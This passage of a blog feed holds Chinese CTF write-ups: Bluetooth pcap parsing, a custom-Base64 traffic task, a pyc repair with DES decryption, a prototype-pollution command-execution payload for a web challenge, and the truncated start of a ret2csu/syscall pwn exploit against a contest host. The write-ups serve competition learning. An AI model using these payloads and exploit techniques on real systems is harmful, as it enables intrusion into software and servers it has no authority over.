src="/mdimg/Bluetooth/14.png"></p><p>根据json文件格式写脚本，从”frame.number”: “968”图片正式传输开始读取数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">import json<br><br><span class="hljs-comment"># 打开并读取JSON文件</span><br>with open(<span class="hljs-string">&quot;1.json&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) as f:<br>    packets = json.load(f)<br><br>data = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> packet <span class="hljs-keyword">in</span> packets:<br>    layers = packet[<span class="hljs-string">&quot;_source&quot;</span>][<span class="hljs-string">&quot;layers&quot;</span>]<br>    <span class="hljs-comment"># 检查&quot;frame.number&quot;键是否存在，且值大于等于968</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;frame.number&quot;</span> <span class="hljs-keyword">in</span> layers[<span class="hljs-string">&quot;frame&quot;</span>] and int(layers[<span class="hljs-string">&quot;frame&quot;</span>][<span class="hljs-string">&quot;frame.number&quot;</span>]) &gt;= 968:<br>        <span class="hljs-comment"># 检查&quot;data&quot;键是否存在</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;data&quot;</span> <span class="hljs-keyword">in</span> layers:<br>            data += layers[<span class="hljs-string">&quot;data&quot;</span>][<span class="hljs-string">&quot;data.data&quot;</span>].replace(<span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br><br>data = data.split(<span class="hljs-string">&quot;a5a50100&quot;</span>)<br>newdata = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> data:<br>    newdata += x[8:]<br><br><span class="hljs-comment"># 将newdata字符串的第24个字符之后的部分进行hex解码，得到一个字节串</span><br><span class="hljs-comment"># 然后，将这个字节串写入到一个名为&quot;flag.jpg&quot;的文件中</span><br>with open(<span class="hljs-string">&quot;flag.jpg&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) as f:<br>    f.write(bytes.fromhex(newdata[24:]))<br></code></pre></td></tr></table></figure><p><img src="/mdimg/Bluetooth/flag.jpg"></p><h2 id="第七届工业信息安全技能大赛车联网安全锦标赛"><a href="#第七届工业信息安全技能大赛车联网安全锦标赛" class="headerlink" title="第七届工业信息安全技能大赛车联网安全锦标赛"></a>第七届工业信息安全技能大赛车联网安全锦标赛</h2><h3 id="GAGA-TT"><a href="#GAGA-TT" class="headerlink" title="GAGA TT"></a>GAGA TT</h3><p>这个就太简单了，一眼丁真，数据在Handle为<code>0x003b</code>中，套用上面的脚本直接梭哈</p><p><img src="/mdimg/Bluetooth/15.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pyshark<br><br>pcap = pyshark.FileCapture(<span class="hljs-string">&#x27;IOT.pcapng&#x27;</span>, display_filter=<span class="hljs-string">&#x27;btatt.opcode == 0x52&#x27;</span>, tshark_path=<span class="hljs-string">&#x27;D:/Wireshark/tshark&#x27;</span>)<br><br>values = []<br><br><span class="hljs-keyword">for</span> pkt <span class="hljs-keyword">in</span> pcap:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(pkt, <span class="hljs-string">&#x27;btatt&#x27;</span>) <span class="hljs-keyword">and</span> <span class="hljs-built_in">hasattr</span>(pkt.btatt, <span class="hljs-string">&#x27;value&#x27;</span>):<br>        value_without_colon = pkt.btatt.value.replace(<span class="hljs-string">&#x27;:&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>        values.append(value_without_colon)<br><br><span class="hljs-comment">#print(&#x27;&#x27;.join(values))</span><br><br>values_str = <span class="hljs-string">&#x27;&#x27;</span>.join(values)<br>values_str = <span class="hljs-built_in">bytes</span>.fromhex(values_str).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br><span class="hljs-built_in">print</span>(values_str)<br><br><span class="hljs-comment">#fk7lqp2ey17cuma7s8gb336e2d42def9a8fJepbUdL2D3c9XzVkhHWu0AstQnOZEmBRqw1y4gISNYrTiF5fskirt</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>蓝牙流量</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DASCTF十一月挑战赛</title>
    <link href="/2023/11/25/DASCTF%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/"/>
    <url>/2023/11/25/DASCTF%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="realrce"><a href="#realrce" class="headerlink" title="realrce"></a>realrce</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;http://4d2b8a71-91db-4dbf-b95a-6be4d3505e29.node4.buuoj.cn:81/&#x27;</span><br><br>payload = &#123;<br>    <span class="hljs-string">&quot;msg&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;__proto__&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;cmd_rce&quot;</span>: <span class="hljs-string">&quot;env&quot;</span>,<br>            <span class="hljs-string">&quot;tingshuitingdiandaxue&quot;</span>: <span class="hljs-string">&quot;%dd&quot;</span><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">try</span>:<br>    response = requests.post(url, json=payload)<br><br>    <span class="hljs-built_in">print</span>(response.text)<br><span class="hljs-keyword">except</span> requests.exceptions.RequestException <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(e)<br></code></pre></td></tr></table></figure><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="IceTea"><a href="#IceTea" class="headerlink" title="IceTea"></a>IceTea</h3><p><img src="/mdimg/2023DASCTF11/1.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">/www/wwwroot/DAS202310.com/<br><br>cd <span class="hljs-string">&quot;/www/wwwroot/DAS202310.com&quot;</span>;<br><br>./ezbase e flag.txt IceTea.txt;<br></code></pre></td></tr></table></figure><p>可以看到对flag.txt执行了base加密操作，追踪TCP流，在流0处，找到一个ELF文件<br><img src="/mdimg/2023DASCTF11/2.png"><br><img src="/mdimg/2023DASCTF11/3.png"></p><p>dump下来查壳发现有upx壳，脱壳后得到Base64的表（这应该是出题人设想的预期解）但实际上我猜测elf文件损坏，导致无法直接使用UPX脱壳工具自动脱壳。在HTTP流4，找到密文（🐜🗡流量要去掉前两位）</p><p><img src="/mdimg/2023DASCTF11/4.png"> </p><p>IDA打开dump下来的elf文件，查看strings，发现有疑似base表的信息，跟进去看一下</p><p><img src="/mdimg/2023DASCTF11/8.png"></p><p>Shift+e看一下</p><p><img src="/mdimg/2023DASCTF11/9.png"></p><p>解一下Hex，就可以看到表了，手动去一下干扰字符</p><p><img src="/mdimg/2023DASCTF11/10.png"></p><p><a href="https://cyberchef.cn/#recipe=From_Base64(&#39;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ%2B/&#39;,true,false)&amp;input=cmVmdHFScmc0UUI5enZaUXp3ZjUweG41MUNaUXhTZjUxZ1pQenhqNXpoakYxQ0k3NXFFPQ">https://cyberchef.cn/#recipe=From_Base64(&#39;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ%2B/&#39;,true,false)&amp;input=cmVmdHFScmc0UUI5enZaUXp3ZjUweG41MUNaUXhTZjUxZ1pQenhqNXpoakYxQ0k3NXFFPQ</a></p><p><img src="/mdimg/2023DASCTF11/11.png"></p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="ezpython"><a href="#ezpython" class="headerlink" title="ezpython"></a>ezpython</h3><p>010打开pyc文件发现key：<code>yuanshen</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> importlib<br><br><span class="hljs-built_in">print</span>(importlib.util.MAGIC_NUMBER.<span class="hljs-built_in">hex</span>())<br><span class="hljs-comment">#a70d0d0a</span><br></code></pre></td></tr></table></figure><p>得到Python3.11的Magic Number，用010修复pyc<br><img src="/mdimg/2023DASCTF11/6.png"><br>使用工具反编译<br><img src="/mdimg/2023DASCTF11/7.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pyDes<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">adjust_length</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(<span class="hljs-built_in">str</span>) &lt; <span class="hljs-number">8</span>:<br>        <span class="hljs-built_in">str</span> = <span class="hljs-built_in">str</span>.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;0&#x27;</span>)<br>    <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(<span class="hljs-built_in">str</span>) &gt; <span class="hljs-number">8</span>:<br>        <span class="hljs-built_in">str</span> = <span class="hljs-built_in">str</span>[:<span class="hljs-number">8</span>]<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">yuanshen</span>(<span class="hljs-params">array, start, end</span>):<br>Unsupported opcode: JUMP_BACKWARD<br>    num = <span class="hljs-built_in">len</span>(array)<br>    dis = [<br>        <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>)] * num<br>    tree = [<br>        <span class="hljs-literal">False</span>] * num<br>    parent = [<br>        -<span class="hljs-number">1</span>] * num<br>    dis[start] = <span class="hljs-number">0</span><br><span class="hljs-comment"># WARNING: Decompyle incomplete</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">qidong</span>(<span class="hljs-params"><span class="hljs-built_in">input</span>, key, IV</span>):<br>    cipher = pyDes.des(key, pyDes.CBC, IV, pad = <span class="hljs-literal">None</span>, padmode = pyDes.PAD_PKCS5)<br>    encrypted_data = cipher.encrypt(<span class="hljs-built_in">input</span>)<br>    encrypted_hex_list = encrypted_data()<br>    <span class="hljs-keyword">return</span> encrypted_hex_list<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    data = [<br>        <span class="hljs-number">159</span>,<br>        <span class="hljs-number">41</span>,<br>        <span class="hljs-number">201</span>,<br>        <span class="hljs-number">125</span>,<br>        <span class="hljs-number">67</span>,<br>        <span class="hljs-number">60</span>,<br>        <span class="hljs-number">44</span>,<br>        <span class="hljs-number">34</span>,<br>        <span class="hljs-number">203</span>,<br>        <span class="hljs-number">56</span>,<br>        <span class="hljs-number">116</span>,<br>        <span class="hljs-number">186</span>,<br>        <span class="hljs-number">13</span>,<br>        <span class="hljs-number">71</span>,<br>        <span class="hljs-number">125</span>,<br>        <span class="hljs-number">30</span>,<br>        <span class="hljs-number">84</span>,<br>        <span class="hljs-number">123</span>,<br>        <span class="hljs-number">109</span>,<br>        <span class="hljs-number">54</span>,<br>        <span class="hljs-number">106</span>,<br>        <span class="hljs-number">56</span>,<br>        <span class="hljs-number">17</span>,<br>        <span class="hljs-number">124</span>,<br>        <span class="hljs-number">87</span>,<br>        <span class="hljs-number">236</span>,<br>        <span class="hljs-number">25</span>,<br>        <span class="hljs-number">12</span>,<br>        <span class="hljs-number">80</span>,<br>        <span class="hljs-number">178</span>,<br>        <span class="hljs-number">165</span>,<br>        <span class="hljs-number">123</span>]<br>    key = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;璇疯緭鍏ey: &#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(key) != <span class="hljs-number">8</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;wrong key lenth!&#x27;</span>)<br>        exit()<br>    flag = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;璇疯緭鍏lag: &#x27;</span>)<br>    array = [<br>        [<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-number">1</span>,<br>            <span class="hljs-number">3</span>,<br>            <span class="hljs-number">4</span>,<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>)],<br>        [<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-number">2</span>,<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-number">4</span>,<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>)],<br>        [<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">8</span>,<br>            <span class="hljs-number">1</span>,<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-number">1</span>],<br>        [<br>            <span class="hljs-number">1</span>,<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-number">8</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-number">3</span>,<br>            <span class="hljs-number">5</span>,<br>            <span class="hljs-number">1</span>,<br>            <span class="hljs-number">2</span>,<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>)],<br>        [<br>            <span class="hljs-number">3</span>,<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-number">1</span>,<br>            <span class="hljs-number">3</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-number">1</span>,<br>            <span class="hljs-number">5</span>,<br>            <span class="hljs-number">3</span>],<br>        [<br>            <span class="hljs-number">4</span>,<br>            <span class="hljs-number">2</span>,<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-number">5</span>,<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-number">1</span>,<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>)],<br>        [<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-number">1</span>,<br>            <span class="hljs-number">1</span>,<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-number">5</span>],<br>        [<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-number">4</span>,<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-number">2</span>,<br>            <span class="hljs-number">5</span>,<br>            <span class="hljs-number">1</span>,<br>            <span class="hljs-number">5</span>,<br>            <span class="hljs-number">0</span>,<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>)],<br>        [<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-number">1</span>,<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-number">3</span>,<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-built_in">float</span>(<span class="hljs-string">&#x27;inf&#x27;</span>),<br>            <span class="hljs-number">0</span>]]<br>    t = yuanshen(array, <span class="hljs-number">1</span>, <span class="hljs-number">8</span>)<br>    IV = (<span class="hljs-keyword">lambda</span> <span class="hljs-number">.0</span>: Unsupported opcode: RETURN_GENERATOR<br><span class="hljs-keyword">pass</span><span class="hljs-comment"># WARNING: Decompyle incomplete</span><br>)(t())<br>    IV = adjust_length(IV)<br>    check = qidong(flag, key, IV)<br>    <span class="hljs-keyword">if</span> check == data:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;yes,yes,yes!!&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>    <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-string">&#x27;bad,bad,bad!!&#x27;</span>)<br><br>main()<br></code></pre></td></tr></table></figure><p>GPT分析了解到是最短路径算法，根据array数组得到<code>iv=15736428</code>，最后解DES</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> DES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> unpad<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_des_cbc</span>(<span class="hljs-params">ciphertext, key, iv</span>):<br>    cipher = DES.new(key.encode(), DES.MODE_CBC, iv.encode())<br>    decrypted_data = unpad(cipher.decrypt(<span class="hljs-built_in">bytes</span>(ciphertext)), DES.block_size)<br>    <span class="hljs-keyword">return</span> decrypted_data.decode()<br><br>data = [<br>        <span class="hljs-number">159</span>,<br>        <span class="hljs-number">41</span>,<br>        <span class="hljs-number">201</span>,<br>        <span class="hljs-number">125</span>,<br>        <span class="hljs-number">67</span>,<br>        <span class="hljs-number">60</span>,<br>        <span class="hljs-number">44</span>,<br>        <span class="hljs-number">34</span>,<br>        <span class="hljs-number">203</span>,<br>        <span class="hljs-number">56</span>,<br>        <span class="hljs-number">116</span>,<br>        <span class="hljs-number">186</span>,<br>        <span class="hljs-number">13</span>,<br>        <span class="hljs-number">71</span>,<br>        <span class="hljs-number">125</span>,<br>        <span class="hljs-number">30</span>,<br>        <span class="hljs-number">84</span>,<br>        <span class="hljs-number">123</span>,<br>        <span class="hljs-number">109</span>,<br>        <span class="hljs-number">54</span>,<br>        <span class="hljs-number">106</span>,<br>        <span class="hljs-number">56</span>,<br>        <span class="hljs-number">17</span>,<br>        <span class="hljs-number">124</span>,<br>        <span class="hljs-number">87</span>,<br>        <span class="hljs-number">236</span>,<br>        <span class="hljs-number">25</span>,<br>        <span class="hljs-number">12</span>,<br>        <span class="hljs-number">80</span>,<br>        <span class="hljs-number">178</span>,<br>        <span class="hljs-number">165</span>,<br>        <span class="hljs-number">123</span>]<br><br>key = <span class="hljs-string">&quot;yuanshen&quot;</span><br>iv = <span class="hljs-string">&quot;15736428&quot;</span><br><br>flag = decrypt_des_cbc(data, key, iv)<br><span class="hljs-built_in">print</span>(flag)<br><br><span class="hljs-comment">#DASCTF&#123;D0_U_4ls0_l1k3_7uansH3n&#125;</span><br></code></pre></td></tr></table></figure><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="asadstory"><a href="#asadstory" class="headerlink" title="asadstory"></a>asadstory</h3><p>ret2csu把close最后一位改成\x15,变成syscall然后用read控rax，openat替换open</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)  <br>elf = ELF(<span class="hljs-string">&#x27;./challenge&#x27;</span>)      <br><br><span class="hljs-comment"># p = process(&quot;./challenge&quot;)</span><br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">28133</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">elf_base</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;: &#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;: &#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>    value = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>) - <span class="hljs-number">0x1249</span><br>    <span class="hljs-keyword">return</span> value<br><br>elf.address = 